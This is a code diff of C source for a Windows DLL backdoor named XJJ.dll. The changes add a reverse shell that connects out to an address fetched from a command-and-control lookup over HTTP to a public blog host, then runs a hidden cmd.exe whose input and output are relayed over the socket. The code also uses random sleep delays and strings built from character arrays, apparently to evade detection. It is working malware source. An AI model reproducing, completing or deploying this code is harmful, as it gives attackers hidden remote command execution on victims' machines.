@@ -1,6 +1,10 @@
 #include "funcs.h"
 
 DWORD WINAPI BindThread( LPVOID lpParam ) {    
+  char tag[] = {
+    '4','4','4','4','6',
+    0
+  } ;
   WSADATA WSAData;
   SOCKET s;
   SOCKET AcceptedSocket;
@@ -10,39 +14,153 @@ DWORD WINAPI BindThread( LPVOID lpParam ) {
   char ip[20] = {0} ;
   char port[20] = {0} ;
   int timeout = 3000 ;
+  SECURITY_ATTRIBUTES saAttr; 
+  HANDLE hStdIn_Rd;
+  HANDLE hStdIn_Wr;
+  HANDLE hStdOut_Rd;
+  HANDLE hStdOut_Wr;
+  STARTUPINFO si;
+  PROCESS_INFORMATION pi;
+  TCHAR cmd[] = TEXT("cmd");
+  sThreadInfo ti;
+  HANDLE Handles[3];
+  DWORD dwThreadID;
+  DWORD ret ;
+  int split ;
   PRINTF( "bind to %s\n" , ( char* )lpParam ) ;
   memcpy( ip , ( char* )lpParam , 15 ) ;
   memcpy( port , ( char* )lpParam + 16 , 5 ) ;
   for( ; ; ) {
-    PRINTF( "inside BindThread loop\n" ) ;
+    srand( ( unsigned )time( NULL ) ) ;
+    split = rand( ) % BIND_SPLIT_RANDOM_RANGE + BIND_SPLIT_RANDOM_BASE ;
+    PRINTF( "inside BindThread loop start\n" ) ;
+    PRINTF( "Sleep %d first\n" , split ) ;
+    Sleep( split * 1000 ) ;
     WSAStartup( MAKEWORD( 2 , 2 ) , &WSAData ) ;
     s = WSASocketA( AF_INET , SOCK_STREAM , 0 , NULL , NULL , NULL ) ;
+    PRINTF( "inside BindThread loop after WSASocketA\n" ) ;
     service.sin_family = AF_INET ;
     service.sin_addr.s_addr = inet_addr( ip ) ;
     service.sin_port = htons( atoi( port ) ) ;
-    PRINTF( "inside BindThread loop 2\n" ) ;
-    /* bind( s , ( SOCKADDR* )&service , sizeof( service ) ) ; */
-    /* listen( s , 0 ) ; */
-    /* AcceptedSocket = accept( s , NULL , NULL ) ; */
-    /* closesocket( s ) ; */
-    connect( s , ( struct sockaddr* )&service , sizeof( service ) ) ;
+    if( connect( s , ( struct sockaddr* )&service , sizeof( service ) ) ) {
+      PRINTF( "inside BindThread loop after connect but failed\n" ) ;
+      continue ;
+    }
+    PRINTF( "inside BindThread loop after connect\n" ) ;
     setsockopt( s , SOL_SOCKET , SO_SNDTIMEO , ( char* )&timeout , sizeof( timeout ) ) ;
-    PRINTF( "inside BindThread loop 3\n" ) ;
-    StartupInfo.hStdError = ( HANDLE )AcceptedSocket ;
-    StartupInfo.hStdOutput = ( HANDLE )AcceptedSocket ;
-    StartupInfo.hStdInput = ( HANDLE )AcceptedSocket ;
-    StartupInfo.dwFlags = STARTF_USESTDHANDLES ;
-    StartupInfo.cb = sizeof( StartupInfo ) ;
-    PRINTF( "inside BindThread loop 4\n" ) ;
-    CreateProcessA( 0 , "cmd.exe" , 0 , 0 , TRUE , 0 , 0 , 0 , &StartupInfo , &ProcessInformation ) ;
-    PRINTF( "inside BindThread loop 5\n" ) ;
-    WaitForSingleObject( ProcessInformation.hProcess , INFINITE ) ;
-    PRINTF( "inside BindThread loop 6\n" ) ;
-    Sleep( 40000000 ) ;
+    saAttr.nLength = sizeof(SECURITY_ATTRIBUTES); 
+    saAttr.bInheritHandle = TRUE; 
+    saAttr.lpSecurityDescriptor = NULL; 
+    if (!CreatePipe(&hStdOut_Rd, &hStdOut_Wr, &saAttr, 0))
+      /* return 0; */
+      continue ;
+    SetHandleInformation(hStdOut_Rd, HANDLE_FLAG_INHERIT, 0);
+    if (!CreatePipe(&hStdIn_Rd, &hStdIn_Wr, &saAttr, 0)) {
+      CloseHandle(hStdOut_Rd);
+      CloseHandle(hStdOut_Wr);
+      /* return 0; */
+      continue ;
+    }
+    PRINTF( "inside BindThread loop after CreatePipe\n" ) ;
+    SetHandleInformation(hStdIn_Wr, HANDLE_FLAG_INHERIT, 0);
+    ZeroMemory(&si, sizeof(si));
+    si.cb = sizeof(si);
+    si.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;
+    si.hStdError = hStdOut_Wr;
+    si.hStdOutput = hStdOut_Wr;
+    si.hStdInput = hStdIn_Rd;
+    si.wShowWindow = SW_HIDE;
+    ZeroMemory(&pi, sizeof(pi));
+    if (CreateProcess(NULL, cmd, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi)) {
+      PRINTF( "inside BindThread loop after CreateProcess\n" ) ;
+      CloseHandle(pi.hThread);
+      ZeroMemory(&ti, sizeof(ti));
+      ti.Socket = s;
+      ti.hStdIn = hStdIn_Wr;
+      ti.hStdOut = hStdOut_Rd;
+      ti.Stop = FALSE;
+      ZeroMemory(Handles, sizeof(Handles));
+      Handles[0] = pi.hProcess;
+      Handles[1] = CreateThread(NULL, 0, &ClientSocketToShell, &ti, 0, &dwThreadID);
+      Handles[2] = CreateThread(NULL, 0, &ShellToClientSocket, &ti, 0, &dwThreadID);
+      PRINTF( "inside BindThread loop after CreateThread\n" ) ;
+      ret = WaitForMultipleObjects(3, Handles, FALSE, INFINITE);
+      ti.Stop = TRUE;
+      if (ret != WAIT_OBJECT_0)
+        TerminateProcess(pi.hProcess, 0);
+      WaitForMultipleObjects(2, &Handles[1], TRUE, INFINITE);
+      PRINTF( "inside BindThread loop after WaitForMultipleObjects\n" ) ;
+      CloseHandle(pi.hProcess);
+      CloseHandle(Handles[1]);
+      CloseHandle(Handles[2]);
+    }
+    CloseHandle(hStdIn_Rd);
+    CloseHandle(hStdIn_Wr);
+    CloseHandle(hStdOut_Rd);
+    CloseHandle(hStdOut_Wr);
   }
 }
 
+DWORD WINAPI ClientSocketToShell(LPVOID lpParameter) {
+  char tag[] = {
+    '4','4','4','4','5',
+    0
+  } ;
+  sThreadInfo *ti = (sThreadInfo*) lpParameter;
+  BYTE buffer[1024];
+  DWORD BytesWritten;
+  fd_set rds;
+  _timeval timeout;
+  int ret ;
+  while (!ti->Stop) {
+    FD_ZERO(&rds);
+    FD_SET(ti->Socket, &rds);
+    timeout.tv_sec = 1;
+    timeout.tv_usec = 0;
+    ret = select(0, &rds, NULL, NULL, &timeout);
+    if (ret < 0)
+      break;
+    if (ret > 0) {
+      ret = recv(ti->Socket, buffer, sizeof(buffer), 0);
+      if (ret <= 0)
+        break;
+      if (!WriteFile(ti->hStdIn, buffer, ret, &BytesWritten, NULL))
+        break;
+    }
+  }
+  return 0;
+}
+
+DWORD WINAPI ShellToClientSocket(LPVOID lpParameter) {
+  char tag[] = {
+    '4','4','4','4','4',
+    0
+  } ;
+  sThreadInfo *ti = (sThreadInfo*) lpParameter;
+  int ret ;
+  BYTE buffer[1024];
+  DWORD BytesAvailable, BytesRead;
+  while (!ti->Stop) {
+    if (!PeekNamedPipe(ti->hStdOut, NULL, 0, NULL, &BytesAvailable, NULL))
+      break;
+    if (BytesAvailable != 0) {
+      if (!ReadFile(ti->hStdOut, buffer, min(sizeof(buffer), BytesAvailable), &BytesRead, NULL))
+        break;
+      ret = send(ti->Socket, buffer, BytesRead, 0);
+      if (ret <= 0)
+        break;
+    }
+    else
+      Sleep(1000);
+  }
+  return 0;
+}
+
 BOOLEAN CheckLocalTime( ) {
+  char tag[] = {
+    '4','4','4','4','1',
+    0
+  } ;
   BOOLEAN rc = FALSE ;
   SYSTEMTIME lt ;
   GetLocalTime( &lt ) ;
@@ -70,6 +188,10 @@ BOOLEAN CheckLocalTime( ) {
 }
 
 void GetCCInfo( char* address ) {
+  char tag[] = {
+    '4','4','4','4','3',
+    0
+  } ;
   int iResult ;
   WSADATA wsaData ;
   SOCKET ConnectSocket = INVALID_SOCKET ;
@@ -84,8 +206,20 @@ void GetCCInfo( char* address ) {
   char buff_inner_last[DEFAULT_BUFLEN+1] ;
   char buff_inner[DEFAULT_BUFLEN+1] ;
   int split ;
+  char CONTEXT[] = {
+    'G','E','T',' ','/','e','c','h','o','f','o','c','u','s',' ','H','T','T','P','/','1','.','1',
+    '\r','\n',
+    'H','o','s','t',':',' ','m','y','.','c','s','d','n','.','n','e','t',
+    '\r','\n',
+    '\r','\n',
+    0
+  } ;
+  char HOSTNAME[] = {
+    'm','y','.','c','s','d','n','.','n','e','t',
+    0
+  } ;
   srand( ( unsigned )time( NULL ) ) ;
-  split = rand()%RANDOM_SEND_GET_SPLIT ;
+  split = rand()%RANDOM_SEND_GET_SPLIT_RANGE ;
   PRINTF( "wait %d then send get request\n" , split ) ;
   Sleep( split * 1000 ) ;
   iResult = WSAStartup( MAKEWORD( 2 , 2 ) , &wsaData ) ;
@@ -200,10 +334,12 @@ void GetCCInfo( char* address ) {
         strcat( addr_inner , buff_inner ) ;
       }
     }
-    else if( 0 == iResult )
+    else if( 0 == iResult ) {
       PRINTF( "Connect closed\n" ) ;
-    else
+    }
+    else {
       PRINTF( "[-] recv : %ld\n" , WSAGetLastError( ) ) ;
+    }
   } while( iResult > 0 ) ;
   iResult = closesocket( ConnectSocket ) ;
 #ifdef _DEBUG_
@@ -227,6 +363,10 @@ BOOLEAN CheckAddress( char* address ) {
 }
 
 DWORD WINAPI DaemonThread( LPVOID lpParam ) {
+  char tag[] = {
+  '4','4','4','4','2',
+    0
+    } ;
   DWORD dwBindThreadId ;
   HANDLE hBindThread = NULL ;
   char address[DEFAULT_BUFLEN] ;
@@ -270,16 +410,17 @@ BOOL WINAPI DllMain(
   HANDLE hDaemonThread ;
   switch( fdwReason ) {
   case DLL_PROCESS_ATTACH :
-    hDaemonThread = CreateThread(
-      NULL ,
-      0 ,
-      DaemonThread ,
-      NULL ,
-      0 ,
-      &dwDaemonThreadId
-      ) ;
-    WaitForSingleObject( hDaemonThread , 1 ) ;
-    CloseHandle( hDaemonThread ) ;
+    /* hDaemonThread = CreateThread( */
+    /*   NULL , */
+    /*   0 , */
+    /*   DaemonThread , */
+    /*   NULL , */
+    /*   0 , */
+    /*   &dwDaemonThreadId */
+    /*   ) ; */
+    /* WaitForSingleObject( hDaemonThread , 1 ) ; */
+    /* CloseHandle( hDaemonThread ) ; */
+    MessageBox( NULL , L"dllmain of XJJ.dll" , NULL , 0 ) ;
     break ;
   case DLL_PROCESS_DETACH :
   case DLL_THREAD_ATTACH :
